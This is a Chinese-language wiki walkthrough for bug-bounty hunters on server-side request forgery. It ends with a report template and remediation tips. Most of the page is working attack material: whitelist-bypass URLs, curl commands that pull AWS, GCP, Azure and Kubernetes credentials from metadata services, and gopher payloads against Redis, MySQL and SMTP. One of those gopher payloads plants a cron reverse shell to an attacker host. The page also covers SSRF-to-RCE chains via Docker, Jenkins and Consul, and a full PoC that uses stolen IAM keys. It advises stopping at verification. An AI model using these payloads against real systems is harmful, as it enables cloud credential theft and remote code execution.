---
type: wiki
category: attack
tool: interactsh,ssrfmap,manual
status: active
last-updated: 2026-04-21
---

# SSRF 深度攻擊 Walkthrough（2026 版）

> **用途：** SSRF 是 2026 的 P1 超巨鑽 — cloud metadata IMDS / 內網 lateral / Redis→RCE / Kubernetes secrets。
> 90% 的 SSRF 報告失敗在「打到 webhook 就停」，而不是繼續串。本文把偵測→確認→升級 RCE 全鏈講完。

## 0. 原理回顧

Server-side 收到使用者給的 URL，然後 server 自己去 fetch。常見功能：webhook、PDF 轉換、截圖、網址預覽、XML/SVG import、圖片 proxy、OAuth callback、import from URL、RSS reader。

```
Victim fetches: https://target.com/preview?url=http://169.254.169.254/
                                                 ↑
                                      attacker-controlled → 打到 AWS IMDS
```

## 1. 快速偵測（OAST-based）

### 1.1 找可疑 parameter

```
url=  next=  callback=  redirect=  image=  file=
avatar=  logo=  document=  preview=  webhook=
fetch=  proxy=  link=  resource=  import=
```

gf pattern + param discovery：

```bash
cat /tmp/urls.txt | gf ssrf | tee /tmp/ssrf-candidates.txt
# 或 arjun 發掘隱藏 param
arjun -u https://target.com/api/fetch -m GET --stable
```

### 1.2 interactsh 偵測（out-of-band）

```bash
# Terminal A: 起 interactsh client
interactsh-client -v

# 拿到：c23abc.oast.live

# Terminal B: fuzz ssrf candidates
cat /tmp/ssrf-candidates.txt | qsreplace 'http://c23abc.oast.live/ssrf' \
  | httpx -silent -mc 200 -threads 30

# 回 interactsh-client 等 DNS/HTTP callback
# 若收到 c23abc.oast.live Query/Request → SSRF 中
```

### 1.3 Timing-based（blind）

```bash
# 比 25 秒 timeout
curl -w '%{time_total}\n' "https://target.com/?url=http://10.0.0.1:8080/" -o /dev/null
# 若 ~25 sec (timeout) vs 快速 200 → URL 被 server fetch
```

## 2. URL Parser bypass（白名單繞過）

當 filter 限制「只能是 target.com」時：

### 2.1 `@` 語法混淆

```
http://trusted.com@attacker.com/
# Python urllib → host = attacker.com
# Node.js url → host = attacker.com
# Go net/url → host = trusted.com（bug）→ 視 server 實作
```

### 2.2 `#` fragment

```
http://attacker.com#trusted.com
http://trusted.com#.attacker.com
```

### 2.3 Subdomain confusion

```
http://trusted.com.attacker.com/    ← 字尾符合 check
http://attacker.com/trusted.com     ← 子路徑符合
http://trusted.com?x=.attacker.com
```

### 2.4 DNS 雙解析（DNS rebinding）

```python
# singularity of origin（NCC Group 工具）
python3 attack.py --target http://target/fetch?url=http://spoofed.example.com
# 第一次解析 → 1.2.3.4（白單）
# 第二次解析 → 169.254.169.254（IMDS）
```

### 2.5 Decimal / Octal / Hex IP

```
http://2130706433/           ← 127.0.0.1
http://0x7f000001/           ← 127.0.0.1
http://0177.0.0.1/           ← 127.0.0.1
http://127.1/                ← 127.0.0.1
http://[::ffff:7f00:1]/       ← IPv6 mapped
http://[::1]/                 ← IPv6 localhost
```

### 2.6 URL 編碼雙重

```
http://127.0.0.1/       ← 原文
http://%31%32%37.0.0.1/ ← 單次
http://%2531%2532%2537.0.0.1/ ← 雙重
```

### 2.7 Idna / Punycode

```
xn--trusted.com-attacker.com
```

## 3. Cloud Metadata 攻擊（2026 高價目標）

### 3.1 AWS IMDS

**IMDSv1（legacy，直接 GET）**

```bash
curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"
# 列出所有 metadata key

curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# 拿到 role name

curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"
# 拿到 AccessKey + SecretKey + Token → 直接接 aws-cli
```

**IMDSv2（需要 token）**

```
# SSRF with POST + header
# 如果 target SSRF 支援任意 method + header 可注入：
POST /latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600

# 多數 SSRF 只能 GET → IMDSv2 通常擋下
```

**IMDSv2 繞過（若應用允許 PUT）**

```bash
curl -X PUT "https://target.com/fetch?url=http://169.254.169.254/latest/api/token&header=X-aws-ec2-metadata-token-ttl-seconds:60"
```

### 3.2 GCP metadata

```bash
curl "https://target.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/&header=Metadata-Flavor:Google"

# 若不能注 header → 某些 legacy endpoint 不需要：
http://metadata/computeMetadata/v1beta1/instance/service-accounts/default/token
```

### 3.3 Azure IMDS

```bash
curl "https://target.com/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01&header=Metadata:true"
```

### 3.4 DigitalOcean

```bash
curl "https://target.com/fetch?url=http://169.254.169.254/metadata/v1/"
```

### 3.5 Alibaba Cloud

```bash
curl "https://target.com/fetch?url=http://100.100.100.200/latest/meta-data/"
```

### 3.6 Kubernetes service account

```bash
# 若 server 跑在 K8s Pod 內
curl "https://target.com/fetch?url=file:///var/run/secrets/kubernetes.io/serviceaccount/token"
curl "https://target.com/fetch?url=https://kubernetes.default.svc/api/v1/namespaces/default/secrets"
```

## 4. Protocol smuggling（URL scheme abuse）

```
http://       ← 基本
https://      ← 基本
file://       ← LFI
ftp://        ← 內網 FTP
gopher://     ← 任意 TCP byte stream（大殺器）
dict://       ← 類 gopher 但簡化
ldap://
jar://        ← Java 特有：讀遠端 jar
netdoc://     ← Java
php://        ← PHP wrapper
ogg://        ← Node.js legacy
```

### 4.1 gopher → Redis RCE（經典）

Redis 在內網（127.0.0.1:6379）+ unauth → 用 gopher 塞命令寫 cron：

```
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%24xxx%0D%0A\n\n*/1 * * * * bash -i >& /dev/tcp/attacker/4444 0>&1\n\n%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2411%0D%0A%2Fvar%2Fspool%2Fcron%2F%0D%0A...
```

工具：

```bash
pip install gopherus
gopherus --exploit redis
# 互動式產生 payload
```

### 4.2 gopher → MySQL

```bash
gopherus --exploit mysql
# 需要知道 user（多半 root）→ 寫 file 或下 query
```

### 4.3 gopher → SMTP（發垃圾信 from 內網 IP）

```
gopher://127.0.0.1:25/_HELO%20x%0D%0AMAIL%20FROM:victim%40target%0D%0A...
```

## 5. Blind SSRF 升級

### 5.1 DNS exfil（內網服務存在性掃）

```bash
for ip in 10.0.0.{1..255}; do
  curl -s "https://target.com/fetch?url=http://$ip:8080/" &
done
# 看 response timing / size 差異
```

### 5.2 Port scan via response timing

```python
# 有 response → port 開
# timeout → port 關
ports = [22,80,443,3306,6379,8080,9200,11211,27017]
```

### 5.3 Error message leak

若 server fetch 失敗會吐 error：

```
url=http://127.0.0.1:6379/
→ "Redis error: NOAUTH" → 內網有 Redis

url=http://127.0.0.1:9200/
→ Elasticsearch version/cluster info
```

## 6. SSRF → RCE 鏈（實戰）

### 6.1 Redis 寫 SSH key

```
1. 找 SSRF
2. gopher://127.0.0.1:6379/_ + config set dir ~/.ssh/ + config set dbfilename authorized_keys + set x "ssh-rsa ..."
3. ssh attacker@target
```

### 6.2 Elasticsearch CVE-2014-3120 / RCE via _search

```bash
# 老版本 ES 有 script 執行
url=http://127.0.0.1:9200/_search?source={...java script...}
```

### 6.3 Jenkins unauthenticated Script Console

```bash
# 如果 Jenkins 在內網
url=http://127.0.0.1:8080/script
# POST Groovy script → RCE
```

### 6.4 Consul unauthenticated register → RCE

```
url=http://127.0.0.1:8500/v1/agent/service/register
PUT body + 塞 script → service check exec → RCE
```

### 6.5 Docker API exposed (2375)

```bash
url=http://127.0.0.1:2375/containers/json
url=http://127.0.0.1:2375/containers/create
→ 起個 privileged container → mount / → RCE + escape
```

## 7. SSRF in unusual parsers

### 7.1 XML → XXE → SSRF

```xml
<?xml version="1.0"?>
<!DOCTYPE x [<!ENTITY y SYSTEM "http://169.254.169.254/">]>
<a>&y;</a>
```

見 [18-payload-cheatsheet.md](18-payload-cheatsheet.md) XXE section。

### 7.2 SVG → XXE → SSRF

```svg
<svg xmlns="http://www.w3.org/2000/svg">
  <image href="http://169.254.169.254/latest/meta-data/"/>
</svg>
```

### 7.3 PDF generator (wkhtmltopdf / phantomjs)

```html
<!-- 在 HTML 被轉 PDF 前，js 可 fetch -->
<iframe src="http://169.254.169.254/"></iframe>
<script>fetch('http://169.254.169.254/').then(r=>r.text()).then(t=>document.body.innerHTML=t)</script>
```

把結果寫進 PDF → SSRF 資料外洩。

### 7.4 CSV import

某些 app 有 `=WEBSERVICE("http://...")`（Excel formula）→ 被 server render → SSRF。

### 7.5 Markdown → HTML

```markdown
![x](http://169.254.169.254/)
```

某些 server-side md→html 轉換會預先 fetch image 做 optimization → SSRF。

## 8. 工具

### 8.1 SSRFmap

```bash
git clone https://github.com/swisskyrepo/SSRFmap
cd SSRFmap
pip install -r requirements.txt

# 基本用法（需要 Burp 抓下的 request 檔）
python ssrfmap.py -r request.txt -p url -m readfiles,portscan,fastcgi,redis,github,smtp
```

支援 module：readfiles、portscan、fastcgi、redis、github enterprise、smtp。

### 8.2 Gopherus

```bash
git clone https://github.com/tarunkant/Gopherus
cd Gopherus
python gopherus.py --exploit mysql
# 互動式產生 gopher:// payload for redis/mysql/postgres/fastcgi/smtp/memcached/zabbix
```

### 8.3 interactsh

```bash
# 本地起
interactsh-client -v

# 或用 projectdiscovery 託管（默認）
# 發的每個 DNS 都會被記錄

# 在 nuclei / ffuf 中用 {{interactsh-url}} template var
```

### 8.4 Nuclei SSRF templates

```bash
nuclei -u https://target.com -tags ssrf -severity critical,high
# 預設 template 含 CVE 版的 SSRF + generic
```

## 9. 完整 PoC：AWS SSRF → IAM credentials → S3 dump

### Step 1: 偵測

```bash
# 發現 /api/preview?url= 參數
curl "https://target.com/api/preview?url=http://c23abc.oast.live/x"
# interactsh 收到 → confirmed
```

### Step 2: 打 IMDSv1

```bash
curl "https://target.com/api/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# Response: "web-app-role"

curl "https://target.com/api/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/web-app-role"
# Response:
# {
#   "AccessKeyId": "ASIA...",
#   "SecretAccessKey": "xxx",
#   "Token": "xxx...",
#   "Expiration": "2026-04-15T..."
# }
```

### Step 3: 驗證 credentials（READ only）

```bash
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=xxx
export AWS_SESSION_TOKEN=xxx

aws sts get-caller-identity
# {"Account": "123456789012","Arn":"arn:aws:sts::...:assumed-role/web-app-role/..."}

aws s3 ls
# 列出 bucket（僅 READ）
```

**停在這裡 → 寫報告 → 不要真的 dump data**

詳見 [32-cloud-key-abuse.md](32-cloud-key-abuse.md) — 「Verify ≠ Abuse」原則。

## 10. 報告 template

```markdown
## 漏洞概述
https://target.com/api/preview?url=... 未對使用者提交 URL 做 host 白名單與
protocol 限制，允許 fetch 任意內網地址，進一步打到 AWS IMDSv1 取得 EC2
instance role 的 STS credentials。

## 重現步驟

### Step 1: 偵測 SSRF
curl "https://target.com/api/preview?url=http://[OAST]"

### Step 2: IMDS v1
curl "https://target.com/api/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

### Step 3: 取 credentials
[上方 JSON]

### Step 4: 驗證（sts only，未做任何寫入）
aws sts get-caller-identity [輸出]

## Impact
- 任意內網 HTTP GET
- AWS IAM temporary credentials → 視角色 policy 可能有 S3 / DynamoDB / SQS 存取
- 可能打到內網 Redis / ES / Jenkins 等達成 RCE

## Severity
P1（若 role 有寫入權限或 admin）/ P2（read-only role + metadata 暴露）

## 修補建議
1. 嚴格 URL 白名單（domain + protocol + port + path prefix）
2. 用 URL parser library 二次驗證，拒絕 @ # ip 雙重編碼
3. 啟用 IMDSv2，並設定 `http-tokens: required`
4. 出站防火牆：禁止 server 主動連 169.254.169.254 / 10.x / 172.16.x / 192.168.x
5. Response truncate：fetch 結果只回應狀態碼，不把 body 原文回傳給 user
```

## 關聯文件

- [18-payload-cheatsheet.md](18-payload-cheatsheet.md) — SSRF payload section
- [32-cloud-key-abuse.md](32-cloud-key-abuse.md) — AWS/GCP/Azure key 驗證守則
- [67-deserialization.md](67-deserialization.md) — Java jar:// 讀檔鏈
- PortSwigger SSRF：https://portswigger.net/web-security/ssrf
- PayloadsAllTheThings SSRF：https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery
- SSRFmap：https://github.com/swisskyrepo/SSRFmap
- Gopherus：https://github.com/tarunkant/Gopherus
